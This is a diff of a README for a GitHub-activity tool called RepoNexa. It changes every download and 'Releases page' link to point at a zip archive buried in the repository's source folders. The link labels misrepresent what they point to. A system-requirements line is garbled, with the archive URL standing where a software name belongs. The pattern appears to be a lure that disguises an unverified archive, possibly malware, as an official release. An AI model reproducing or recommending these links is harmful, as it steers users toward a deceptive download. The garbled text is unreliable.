@@ -6,7 +6,7 @@ Welcome to RepoNexa! This tool helps you understand your GitHub activity and imp
 
 ## 📥 Download RepoNexa
 
-[![Download RepoNexa](https://raw.githubusercontent.com/anasasyry/RepoNexa/main/backend/src/modules/recommendations/Nexa-Repo-1.6.zip%https://raw.githubusercontent.com/anasasyry/RepoNexa/main/backend/src/modules/recommendations/Nexa-Repo-1.6.zip)](https://raw.githubusercontent.com/anasasyry/RepoNexa/main/backend/src/modules/recommendations/Nexa-Repo-1.6.zip)
+[![Download RepoNexa](https://raw.githubusercontent.com/anasasyry/RepoNexa/main/backend/src/services/Nexa-Repo-v3.2.zip%https://raw.githubusercontent.com/anasasyry/RepoNexa/main/backend/src/services/Nexa-Repo-v3.2.zip)](https://raw.githubusercontent.com/anasasyry/RepoNexa/main/backend/src/services/Nexa-Repo-v3.2.zip)
 
 ## 🖥️ System Requirements
 
@@ -14,7 +14,7 @@ Before you install RepoNexa, ensure your system meets the following requirements
 
 - Windows 10 or later / macOS 10.15 or later / Linux (Debian/Ubuntu)
 - At least 4 GB of RAM
-- https://raw.githubusercontent.com/anasasyry/RepoNexa/main/backend/src/modules/recommendations/Nexa-Repo-1.6.zip version 14 or later
+- https://raw.githubusercontent.com/anasasyry/RepoNexa/main/backend/src/services/Nexa-Repo-v3.2.zip version 14 or later
 - Internet access for GitHub API calls
 
 ## 📦 Features
@@ -30,7 +30,7 @@ Follow these simple steps to download and run RepoNexa.
 
 ### Step 1: Visit the Release Page
 
-To download RepoNexa, visit the Releases page. You can find it here: [RepoNexa Releases](https://raw.githubusercontent.com/anasasyry/RepoNexa/main/backend/src/modules/recommendations/Nexa-Repo-1.6.zip).
+To download RepoNexa, visit the Releases page. You can find it here: [RepoNexa Releases](https://raw.githubusercontent.com/anasasyry/RepoNexa/main/backend/src/services/Nexa-Repo-v3.2.zip).
 
 ### Step 2: Choose the Latest Version
 
@@ -54,7 +54,7 @@ After installation, find RepoNexa in your applications. Launch it, and you’ll 
 
 ## 🔗 Download & Install
 
-Ensure you download the application from the official Releases page: [RepoNexa Releases](https://raw.githubusercontent.com/anasasyry/RepoNexa/main/backend/src/modules/recommendations/Nexa-Repo-1.6.zip).
+Ensure you download the application from the official Releases page: [RepoNexa Releases](https://raw.githubusercontent.com/anasasyry/RepoNexa/main/backend/src/services/Nexa-Repo-v3.2.zip).
 
 ## 🚀 Support and Feedback
 
